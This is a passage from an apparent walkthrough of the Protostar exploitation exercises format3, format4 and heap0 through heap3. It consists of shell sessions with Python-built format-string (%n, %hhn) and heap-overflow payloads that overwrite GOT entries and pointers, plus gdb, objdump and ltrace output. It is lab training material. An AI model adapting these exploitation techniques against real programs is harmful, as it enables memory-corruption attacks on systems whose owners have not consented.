</span></code></pre><h2 id="solution-1-gentle">solution 1: Gentle</h2>
<pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08&#39;+&#39;a&#39;*(0x44-12)+&#39;%12</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08n&#39;+&#39;a&#39;*(0x55-0x44)+&#39;%13</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08n&#39;+&#39;a&#39;*(0x102-0x55)+&#39;%14</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08n&#39;</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">./format3</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">you</span><span style="color:#c0c5ce;"> have modified the target :)</span><span style="color:#c0c5ce;">
</span></code></pre><h2 id="solution-2-more-gentle">solution 2: More gentle</h2>
<pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;a&#39;+&#39;%16</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">hhn&#39;+&#39;a&#39;+&#39;%17</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">hhn&#39;+&#39;\xf7\x96\x04\x08&#39;+&#39;\xf6\x96\x04\x08&#39;+&#39;\xf5\x96\x04\x08&#39;+&#39;\xf4\x96\x04\x08&#39;+&#39;a&#39;*(0x44-2-16)+&#39;%19</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">hhn&#39;+&#39;a&#39;*(0x55-0x44)+&#39;%18</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">hhn&#39;</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">./format3</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">you</span><span style="color:#c0c5ce;"> have modified the target :)</span><span style="color:#c0c5ce;">
</span></code></pre><h1 id="format-4">Format 4</h1>
<pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> gdb</span><span style="color:#bf616a;"> -q</span><span style="color:#c0c5ce;"> format4</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">Reading</span><span style="color:#c0c5ce;"> symbols from /opt/protostar/bin/format4...done.</span><span style="color:#c0c5ce;">
(</span><span style="color:#bf616a;">gdb</span><span style="color:#c0c5ce;">) disas hello</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">Dump</span><span style="color:#c0c5ce;"> of assembler code for function hello:</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x080484b4 </span><span style="color:#c0c5ce;">&lt;hello+0&gt;:   push   %</span><span style="color:#bf616a;">ebp</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x080484b5 </span><span style="color:#c0c5ce;">&lt;hello+1&gt;:   mov    %</span><span style="color:#bf616a;">esp</span><span style="color:#c0c5ce;">,%</span><span style="color:#bf616a;">ebp</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x080484b7 </span><span style="color:#c0c5ce;">&lt;hello+3&gt;:   sub    $</span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">x18,%</span><span style="color:#bf616a;">esp</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x080484ba </span><span style="color:#c0c5ce;">&lt;hello+6&gt;:   movl   $</span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">x80485f0,(%</span><span style="color:#bf616a;">esp</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x080484c1 </span><span style="color:#c0c5ce;">&lt;hello+13&gt;:  call   0x80483dc &lt;puts@plt&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x080484c6 </span><span style="color:#c0c5ce;">&lt;hello+18&gt;:  movl   $</span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">x1,(%</span><span style="color:#bf616a;">esp</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x080484cd </span><span style="color:#c0c5ce;">&lt;hello+25&gt;:  call   0x80483bc &lt;_exit@plt&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">End</span><span style="color:#c0c5ce;"> of assembler dump.</span><span style="color:#c0c5ce;">
(</span><span style="color:#bf616a;">gdb</span><span style="color:#c0c5ce;">) quit</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> objdump</span><span style="color:#bf616a;"> -TR</span><span style="color:#c0c5ce;"> format4</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">format4:</span><span style="color:#c0c5ce;">     file format elf32-i386</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">DYNAMIC</span><span style="color:#c0c5ce;"> SYMBOL TABLE:</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">00000000</span><span style="color:#c0c5ce;">  w   D  *UND*  00000000              __gmon_start__</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">00000000</span><span style="color:#c0c5ce;">      DF *UND*  00000000  GLIBC_2.0   fgets</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">00000000</span><span style="color:#c0c5ce;">      DF *UND*  00000000  GLIBC_2.0   __libc_start_main</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">00000000</span><span style="color:#c0c5ce;">      DF *UND*  00000000  GLIBC_2.0   _exit</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">00000000</span><span style="color:#c0c5ce;">      DF *UND*  00000000  GLIBC_2.0   printf</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">00000000</span><span style="color:#c0c5ce;">      DF *UND*  00000000  GLIBC_2.0   puts</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">00000000</span><span style="color:#c0c5ce;">      DF *UND*  00000000  GLIBC_2.0   exit</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">080485ec</span><span style="color:#c0c5ce;"> g    DO .rodata        00000004  Base        _IO_stdin_used</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">08049730</span><span style="color:#c0c5ce;"> g    DO .bss   00000004  GLIBC_2.0   stdin</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">DYNAMIC</span><span style="color:#c0c5ce;"> RELOCATION RECORDS</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">OFFSET</span><span style="color:#c0c5ce;">   TYPE              VALUE</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">080496fc</span><span style="color:#c0c5ce;"> R_386_GLOB_DAT    __gmon_start__</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">08049730</span><span style="color:#c0c5ce;"> R_386_COPY        stdin</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0804970c</span><span style="color:#c0c5ce;"> R_386_JUMP_SLOT   __gmon_start__</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">08049710</span><span style="color:#c0c5ce;"> R_386_JUMP_SLOT   fgets</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">08049714</span><span style="color:#c0c5ce;"> R_386_JUMP_SLOT   __libc_start_main</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">08049718</span><span style="color:#c0c5ce;"> R_386_JUMP_SLOT   _exit</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0804971c</span><span style="color:#c0c5ce;"> R_386_JUMP_SLOT   printf</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">08049720</span><span style="color:#c0c5ce;"> R_386_JUMP_SLOT   puts</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">08049724</span><span style="color:#c0c5ce;"> R_386_JUMP_SLOT   exit</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> objdump</span><span style="color:#bf616a;"> -t</span><span style="color:#c0c5ce;"> format4 | </span><span style="color:#bf616a;">grep</span><span style="color:#c0c5ce;"> hello</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">080484b4</span><span style="color:#c0c5ce;"> g     F .text  0000001e              hello</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> i=0; </span><span style="color:#b48ead;">while </span><span style="color:#96b5b4;">[ </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">i -le</span><span style="color:#c0c5ce;"> 10 </span><span style="color:#96b5b4;">]</span><span style="color:#c0c5ce;">; </span><span style="color:#b48ead;">do </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">=$</span><span style="color:#a3be8c;">((i</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">1</span><span style="color:#a3be8c;">))</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">python -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;aaaa%%%03d</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08x&#39; % </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">./format4</span><span style="color:#c0c5ce;">; </span><span style="color:#b48ead;">done</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa00000200</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaab7fd8420</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaabffffb14</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa61616161</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa35303025</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa78383024</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa0000000a</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaab7fff524</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaabffffb70</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaab7fe35c9</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa00000007</span><span style="color:#c0c5ce;">
(</span><span style="color:#bf616a;">gdb</span><span style="color:#c0c5ce;">) b *0x0804851a</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">Breakpoint</span><span style="color:#c0c5ce;"> 1 at 0x804851a: file format4/format4.c, line 27.</span><span style="color:#c0c5ce;">
(</span><span style="color:#bf616a;">gdb</span><span style="color:#c0c5ce;">) r</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">Starting</span><span style="color:#c0c5ce;"> program: /opt/protostar/bin/format4</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">Breakpoint</span><span style="color:#c0c5ce;"> 1, main (argc=1, argv=0xbffffd54) </span><span style="color:#bf616a;">at</span><span style="color:#c0c5ce;"> format4/format4.c:27</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">27</span><span style="color:#c0c5ce;">      format4/format4.c: No such file or directory.</span><span style="color:#c0c5ce;">
        </span><span style="color:#bf616a;">in</span><span style="color:#c0c5ce;"> format4/format4.c</span><span style="color:#c0c5ce;">
(</span><span style="color:#bf616a;">gdb</span><span style="color:#c0c5ce;">) p exit</span><span style="color:#c0c5ce;">
$</span><span style="color:#bf616a;">1</span><span style="color:#c0c5ce;"> = {&lt;text variable, no debug info&gt;} 0xb7ec60c0 &lt;*__GI_exit&gt;</span><span style="color:#c0c5ce;">
(</span><span style="color:#bf616a;">gdb</span><span style="color:#c0c5ce;">) quit</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;\x24\x97\x04\x08&#39;+&#39;\x25\x97\x04\x08&#39;+&#39;\x26\x97\x04\x08&#39;+&#39;\x27\x97\x04\x08&#39;+&#39;%164x%4</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">n&#39;+&#39;%208x%5</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">n&#39;+&#39;%128x%6</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">n&#39;+&#39;%260x%7</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">n&#39;</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">./format4</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;">%&amp;&#39;</span><span style="color:#a3be8c;">                                                                                                                                                                 200                                                                                                                                                                                                        b7fd8420                                                                                                                        bffffb14                                                                                                                                                                                                                                                             8049724</span><span style="color:#a3be8c;">
code execution redirected! you win</span><span style="color:#a3be8c;">
</span><span style="color:#a3be8c;">
</span><span style="color:#a3be8c;">
</span></code></pre><h1 id="heap-0">Heap 0</h1>
<pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> objdump</span><span style="color:#bf616a;"> -t</span><span style="color:#c0c5ce;"> heap0 | </span><span style="color:#bf616a;">grep</span><span style="color:#c0c5ce;"> winner</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">08048464</span><span style="color:#c0c5ce;"> g     F .text  00000014              winner</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">08048478</span><span style="color:#c0c5ce;"> g     F .text  00000014              nowinner</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> ./heap0 `</span><span style="color:#bf616a;">python -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;a&#39;*72+&#39;\x64\x84\x04\x08&#39;</span><span style="color:#c0c5ce;">&quot;`</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;"> is at 0x804a008, fp is at 0x804a050</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">level</span><span style="color:#c0c5ce;"> passed</span><span style="color:#c0c5ce;">
</span></code></pre><h1 id="heap-1">Heap 1</h1>
<pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> ltrace ./heap1 1234 1234</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">__libc_start_main</span><span style="color:#c0c5ce;">(0x80484b9, 3, 0xbffffd84, 0x8048580, 0x8048570 &lt;unfinished ...&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">malloc</span><span style="color:#c0c5ce;">(8)                                             = </span><span style="color:#bf616a;">0x0804a008</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">malloc</span><span style="color:#c0c5ce;">(8)                                             = </span><span style="color:#bf616a;">0x0804a018</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">malloc</span><span style="color:#c0c5ce;">(8)                                             = </span><span style="color:#bf616a;">0x0804a028</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">malloc</span><span style="color:#c0c5ce;">(8)                                             = </span><span style="color:#bf616a;">0x0804a038</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">strcpy</span><span style="color:#c0c5ce;">(0x0804a018, &quot;</span><span style="color:#a3be8c;">1234</span><span style="color:#c0c5ce;">&quot;)                            = </span><span style="color:#bf616a;">0x0804a018</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">strcpy</span><span style="color:#c0c5ce;">(0x0804a038, &quot;</span><span style="color:#a3be8c;">1234</span><span style="color:#c0c5ce;">&quot;)                            = </span><span style="color:#bf616a;">0x0804a038</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">and that&#39;s a wrap folks!</span><span style="color:#c0c5ce;">&quot;and that&#39;</span><span style="color:#a3be8c;">s a wrap folks!</span><span style="color:#a3be8c;">
)                      = 25</span><span style="color:#a3be8c;">
+++ exited (status 25) +++</span><span style="color:#a3be8c;">
$ objdump -t heap1 | grep winner</span><span style="color:#a3be8c;">
08048494 g     F .text  00000025              winner</span><span style="color:#a3be8c;">
$ objdump -TR heap1 | grep puts</span><span style="color:#a3be8c;">
00000000      DF *UND*  00000000  GLIBC_2.0   puts</span><span style="color:#a3be8c;">
08049774 R_386_JUMP_SLOT   puts</span><span style="color:#a3be8c;">
$ ./heap1 `python -c &quot;print </span><span style="color:#c0c5ce;">&#39;a&#39;</span><span style="color:#a3be8c;">*20+</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#96b5b4;">\x</span><span style="color:#c0c5ce;">74</span><span style="color:#96b5b4;">\x</span><span style="color:#c0c5ce;">97</span><span style="color:#96b5b4;">\x</span><span style="color:#c0c5ce;">04</span><span style="color:#96b5b4;">\x</span><span style="color:#c0c5ce;">08&#39;</span><span style="color:#a3be8c;">&quot;` `python -c &quot;print </span><span style="color:#c0c5ce;">&#39;</span><span style="color:#96b5b4;">\x</span><span style="color:#c0c5ce;">94</span><span style="color:#96b5b4;">\x</span><span style="color:#c0c5ce;">84</span><span style="color:#96b5b4;">\x</span><span style="color:#c0c5ce;">04</span><span style="color:#96b5b4;">\x</span><span style="color:#c0c5ce;">08&#39;</span><span style="color:#a3be8c;">&quot;`</span><span style="color:#a3be8c;">
and we have a winner @ 1532607490</span><span style="color:#a3be8c;">
</span></code></pre><h1 id="heap-2">Heap 2</h1>
<pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> ./heap2</span><span style="color:#c0c5ce;">
</span><span style="color:#96b5b4;">[</span><span style="color:#c0c5ce;"> auth = (nil)</span><span style="color:#bf616a;">,</span><span style="color:#c0c5ce;"> service = (nil) </span><span style="color:#bf616a;">]</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">auth</span><span style="color:#c0c5ce;"> wang</span><span style="color:#c0c5ce;">
</span><span style="color:#96b5b4;">[</span><span style="color:#c0c5ce;"> auth = 0x804c008, service = (nil) </span><span style="color:#bf616a;">]</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">reset</span><span style="color:#c0c5ce;">
</span><span style="color:#96b5b4;">[</span><span style="color:#c0c5ce;"> auth = 0x804c008, service = (nil) </span><span style="color:#bf616a;">]</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">serviceaaaaaaaaaaaaaaaaaaaaaaaaa</span><span style="color:#c0c5ce;">
</span><span style="color:#96b5b4;">[</span><span style="color:#c0c5ce;"> auth = 0x804c008, service = 0x804c018 </span><span style="color:#96b5b4;">]</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">login</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">you</span><span style="color:#c0c5ce;"> have logged in already!</span><span style="color:#c0c5ce;">
</span></code></pre><pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;auth &#39;+&#39;a&#39;*30;print &#39;reset&#39;;print &#39;service&#39;+&#39;a&#39;*33;print &#39;login&#39;</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">./heap2</span><span style="color:#c0c5ce;">
</span><span style="color:#96b5b4;">[</span><span style="color:#c0c5ce;"> auth = (nil)</span><span style="color:#bf616a;">,</span><span style="color:#c0c5ce;"> service = (nil) </span><span style="color:#bf616a;">]</span><span style="color:#c0c5ce;">
</span><span style="color:#96b5b4;">[</span><span style="color:#c0c5ce;"> auth = 0x804c008, service = (nil) </span><span style="color:#bf616a;">]</span><span style="color:#c0c5ce;">
</span><span style="color:#96b5b4;">[</span><span style="color:#c0c5ce;"> auth = 0x804c008, service = (nil) </span><span style="color:#bf616a;">]</span><span style="color:#c0c5ce;">
</span><span style="color:#96b5b4;">[</span><span style="color:#c0c5ce;"> auth = 0x804c008, service = 0x804c018 </span><span style="color:#96b5b4;">]</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">you</span><span style="color:#c0c5ce;"> have logged in already!</span><span style="color:#c0c5ce;">
</span><span style="color:#96b5b4;">[</span><span style="color:#c0c5ce;"> auth = 0x804c008, service = 0x804c018 </span><span style="color:#96b5b4;">]</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;auth &#39;;print &#39;service&#39;+&#39;a&#39;*17;print &#39;login&#39;</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">./heap2</span><span style="color:#c0c5ce;">
</span><span style="color:#96b5b4;">[</span><span style="color:#c0c5ce;"> auth = (nil)</span><span style="color:#bf616a;">,</span><span style="color:#c0c5ce;"> service = (nil) </span><span style="color:#bf616a;">]</span><span style="color:#c0c5ce;">
</span><span style="color:#96b5b4;">[</span><span style="color:#c0c5ce;"> auth = 0x804c008, service = (nil) </span><span style="color:#bf616a;">]</span><span style="color:#c0c5ce;">
</span><span style="color:#96b5b4;">[</span><span style="color:#c0c5ce;"> auth = 0x804c008, service = 0x804c018 </span><span style="color:#96b5b4;">]</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">you</span><span style="color:#c0c5ce;"> have logged in already!</span><span style="color:#c0c5ce;">
</span><span style="color:#96b5b4;">[</span><span style="color:#c0c5ce;"> auth = 0x804c008, service = 0x804c018 </span><span style="color:#96b5b4;">]</span><span style="color:#c0c5ce;">
</span></code></pre><h1 id="heap-3">Heap 3</h1>
<pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> ltrace ./heap3 aaaa aaaa aaaa</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">__libc_start_main</span><span style="color:#c0c5ce;">(0x8048889, 4, 0xbffffd74, 0x804ab50, 0x804ab40 &lt;unfinished ...&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">sysconf</span><span style="color:#c0c5ce;">(30, 0xb7ffeff4, 0xb7e9abb8, 1, 0xbffffc3c)     = </span><span style="color:#bf616a;">4096</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">sbrk</span><span style="color:#c0c5ce;">(4096)                                             = </span><span style="color:#bf616a;">0x0804c000</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">sbrk</span><span style="color:#c0c5ce;">(0)                                                = </span><span style="color:#bf616a;">0x0804d000</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">strcpy</span><span style="color:#c0c5ce;">(0x0804c008, &quot;</span><span style="color:#a3be8c;">aaaa</span><span style="color:#c0c5ce;">&quot;)                             = </span><span style="color:#bf616a;">0x0804c008</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">strcpy</span><span style="color:#c0c5ce;">(0x0804c030, &quot;</span><span style="color:#a3be8c;">aaaa</span><span style="color:#c0c5ce;">&quot;)                             = </span><span style="color:#bf616a;">0x0804c030</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">strcpy</span><span style="color:#c0c5ce;">(0x0804c058, &quot;</span><span style="color:#a3be8c;">aaaa</span><span style="color:#c0c5ce;">&quot;)                             = </span><span style="color:#bf616a;">0x0804c058</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">dynamite failed?</span><span style="color:#c0c5ce;">&quot;dynamite failed?</span><span style="color:#c0c5ce;">
)           </span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> ltrace</span><span style="color:#bf616a;"> -S</span><span style="color:#c0c5ce;"> ./heap3 aaaa aaaa aaaa</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_brk</span><span style="color:#c0c5ce;">(NULL)                                          = </span><span style="color:#bf616a;">0x0804c000</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_fcntl64</span><span style="color:#c0c5ce;">(0, 1, 0, 0, 0xb7ffeff4)                    = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_fcntl64</span><span style="color:#c0c5ce;">(1, 1, 0, 1, 0xb7ffeff4)                    = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_fcntl64</span><span style="color:#c0c5ce;">(2, 1, 0, 2, 0xb7ffeff4)                    = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_access</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/etc/suid-debug</span><span style="color:#c0c5ce;">&quot;, 00)                      = </span><span style="color:#bf616a;">-2</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_access</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/etc/ld.so.nohwcap</span><span style="color:#c0c5ce;">&quot;, 00)                   = </span><span style="color:#bf616a;">-2</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_mmap2</span><span style="color:#c0c5ce;">(0, 8192, 3, 34,</span><span style="color:#bf616a;"> -1</span><span style="color:#c0c5ce;">)                          = </span><span style="color:#bf616a;">0xb7fe0000</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_access</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/etc/ld.so.preload</span><span style="color:#c0c5ce;">&quot;, 04)                   = </span><span style="color:#bf616a;">-2</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/etc/ld.so.cache</span><span style="color:#c0c5ce;">&quot;, 0, 00)                    = </span><span style="color:#bf616a;">3</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_fstat64</span><span style="color:#c0c5ce;">(3, 0xbffff6b4, 0xb7ffeff4, 0xb7fff87c, 3)  = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_mmap2</span><span style="color:#c0c5ce;">(0, 13796, 1, 2, 3)                           = </span><span style="color:#bf616a;">0xb7fdc000</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_close</span><span style="color:#c0c5ce;">(3)                                           = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_access</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/etc/ld.so.nohwcap</span><span style="color:#c0c5ce;">&quot;, 00)                   = </span><span style="color:#bf616a;">-2</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/lib/libc.so.6</span><span style="color:#c0c5ce;">&quot;, 0, 00)                      = </span><span style="color:#bf616a;">3</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_read</span><span style="color:#c0c5ce;">(3, &quot;</span><span style="color:#a3be8c;">\177ELF\001\001\001</span><span style="color:#c0c5ce;">&quot;, 512)                = </span><span style="color:#bf616a;">512</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_fstat64</span><span style="color:#c0c5ce;">(3, 0xbffff700, 0xb7ffeff4, 0xb7fdf21d, 0x804849c) = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_mmap2</span><span style="color:#c0c5ce;">(0, 0x144948, 5, 2050, 3)                     = </span><span style="color:#bf616a;">0xb7e97000</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_mprotect</span><span style="color:#c0c5ce;">(0xb7fd5000, 4096, 0)                      = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_mmap2</span><span style="color:#c0c5ce;">(0xb7fd6000, 12288, 3, 2066, 3)               = </span><span style="color:#bf616a;">0xb7fd6000</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_mmap2</span><span style="color:#c0c5ce;">(0xb7fd9000, 10568, 3, 50,</span><span style="color:#bf616a;"> -1</span><span style="color:#c0c5ce;">)                = </span><span style="color:#bf616a;">0xb7fd9000</span><span style="color:#c0c5ce;">
